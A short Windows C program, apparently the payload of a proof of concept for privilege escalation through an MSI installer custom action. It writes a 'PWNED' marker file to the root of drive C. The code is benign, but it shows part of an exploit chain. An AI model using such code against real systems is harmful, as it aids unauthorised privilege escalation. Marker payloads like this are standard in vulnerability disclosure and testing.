#include <windows.h>
#include <string.h>
int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
    HANDLE f = CreateFileA("C:\\poc-marker.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        const char *m = "PWNED: elevated MSI custom action executed\r\n";
        DWORD w = 0;
        WriteFile(f, m, (DWORD)strlen(m), &w, NULL);
        CloseHandle(f);
    }
    return 0;
}
